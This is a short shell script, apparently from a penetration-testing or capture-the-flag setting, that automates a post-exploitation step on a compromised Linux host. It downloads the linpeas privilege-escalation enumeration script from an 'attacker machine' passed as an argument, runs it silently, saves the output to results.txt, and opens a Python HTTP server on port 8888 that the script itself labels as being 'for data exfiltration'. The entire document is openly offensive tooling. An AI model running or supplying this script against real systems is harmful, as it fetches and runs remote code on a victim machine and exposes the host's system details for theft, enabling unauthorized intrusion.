echo "getting linpeas from attacker machine"
wget http://$1/linpeas.sh;
echo "giving linpeas execute permission"
chmod +x linpeas.sh;
echo "Running linpeas and saving results into result.txt file"
{ ./linpeas.sh > results.txt; } >/dev/null 2>&1
echo "Setting up a python server port 8888 for data exfiltration"
python3 -m http.server 8888;
